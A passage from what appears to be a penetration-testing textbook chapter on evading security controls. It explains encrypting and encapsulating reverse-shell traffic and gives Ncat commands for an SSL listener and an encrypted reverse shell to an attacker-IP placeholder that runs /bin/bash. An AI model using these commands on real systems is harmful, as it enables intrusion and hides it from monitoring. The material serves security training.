# Bypassing Security Controls
**Chapter** 7 &emsp;|&emsp; **Page** 150

There will be times when you find that the utility of the shell you've established is limited due to the environment.
The shell itself could be limited, or the target environment may reduce the number of packages available in order to harden the system.
<br>
<br>
For instance, a slimmed down container such as p-web-02 (\*one of the book's demo target systems) runs with the bare minimum software required to function.
A lack of built-in or installed binaries is normal for cloud-hosted web application servers. This is due to performance, security, and resource optimization.
A slim system image requires less maintenance overhead and provides faster deployment times.
<br>
<br>
The objective in this section is to highlight a few high-level techniques to hide reverse shell communications or bypass security restrictions in hardened environments.
Techniques such as these can help evade initial access security measures and allow us to maintain control over compromised systems.


## Encrypting and Encapsulating Traffic
To evade detection, reverse shells can leverage encryption and encapsulation techniques to hide malicious traffic within legitimate protocols or connections.
By *encrypting* the communication, we render the contents in the reverse shell traffic unreadable, making it difficult for security devices to identify any malicious payload or commands being sent.
<br>
<br>
With *encapsulation*, we conceal the reverse shell traffic within innocuous protocals or already-encrypted connections. This technique disguises the reverse shell communications as legitimate traffic.
<br>
<br>
##### Diagram of how an encrypted tunnel between a compromised server and a attacking machine could work:
![Encrypted Tunnel Diagram](./encrypted-reverse-shell-tunnel.svg)

There are multiple ways to create a reverse shell over an encrypted protocol.
One way is by using *Ncat* (\***NOT** to be confused with Netcat), which is a network that is packaged with Nmap and allows for the redirection, writing, reading, and encryption of traffic.
<br>
<br>
So, if we wanted to establish a reverse shell connection encapsulated by an encrypted tunnel, we could leverage Ncat using the following command sequence below.
<br>
<br>
Use Ncat to start a Secure Sockets Layer (SSL) listener on the attacking machine:
```
ncat -v -l 9443 --ssl
```

- The `-v` [verbose] flag makes output more detailed.
- The `-l` [listen] flag instructs Ncat to listen for incoming connections.
- The number `9443` declares which port to listen on.
- The `--ssl` option is used to enable encryption.
    - By default, Ncat will generate temporary asymmetric keys (Rivest-Shamir-Adleman, or RSA) unless specified otherwise.
    
On the compromised machine, run the following command to establish an encrypted reverse shell:
```
ncat ATTACKER_IP_ADDRESS 9443 --ssl -e /bin/bash -v
```

- We specify the attacking machine's IP address (e.g., 172.16.10.1).
- Specify the listening port (`9443`).
- Use the `--ssl` option to enables encryption.
- The -e [execute] flag followed by a path (*/bin/bash*) specifies to execute using the Bash shell.
- The `-v` flag makes output verbose.

<br>
<br>

## Alternating Between Destination Ports
